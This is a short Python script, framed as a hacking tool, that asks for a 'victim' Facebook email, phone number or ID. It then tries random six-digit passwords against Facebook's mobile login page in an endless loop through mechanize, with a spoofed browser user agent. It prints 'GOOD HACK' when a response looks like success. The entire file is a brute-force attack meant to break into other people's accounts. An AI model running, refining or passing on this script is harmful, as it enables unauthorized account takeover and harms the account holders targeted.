import random,time,mechanize,os
a = '\033[1;31m' #احمر
b = '\033[1;33m' #صفر
c = '\033[2;31m' #احمر ثاني
d = '\033[2;32m' #اخضر
e = '\033[2;34m'#ازرق
f = '\033[2;35m' #وردي
g = '\033[2;36m'#سمائي
h = '\033[1;34m' #ازرق فاتح
i = '\033[1;31m' #احمر
os.system('clear')
time.sleep(3)
print(g+'''╔═╗╔═╗╔═══╗╔╗─╔╗╔═══╗╔═╗╔═╗╔═══╗╔═══╗
║║╚╝║║║╔═╗║║║─║║║╔═╗║║║╚╝║║║╔══╝╚╗╔╗║
║╔╗╔╗║║║─║║║╚═╝║║║─║║║╔╗╔╗║║╚══╗─║║║║
║║║║║║║║─║║║╔═╗║║╚═╝║║║║║║║║╔══╝─║║║║
║║║║║║║╚═╝║║║─║║║╔═╗║║║║║║║║╚══╗╔╝╚╝║
╚╝╚╝╚╝╚═══╝╚╝─╚╝╚╝─╚╝╚╝╚╝╚╝╚═══╝╚═══╝'''+g)
print(b+"[÷]"+g+"SCRIPT BY MOHAMED BOUGRINA ©")
print(b+"="*60)
gmail = input("\t"+"ENTRE GMAIL OR PHONE OR ID VICTIM : "+g)
browser = mechanize.Browser()
browser.set_handle_robots(False)
cookies = mechanize.CookieJar()
browser.set_cookiejar(cookies)
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
browser.set_handle_refresh(False)
while 1:
    passwords = str(random.randint(100000,999999))
    url = 'http://m.facebook.com/login.php'
    browser.open(url)
    browser.select_form(nr = 0)       #This is login-password  form -> nr = number = 0
    time.sleep(1)
    browser.form['email'] = gmail
    browser.form['pass'] = passwords
    response = browser.submit()
    if 'regular_login' in str(response.read()):
        print(f+"="*60)
        print("\t"+d+"[?] GOOD HACK »»»»"+h+passwords)
    else:
        print(f+"="*60)
        print(d+"[!] PASSWORD ERROR  [÷]>>> "+h+passwords)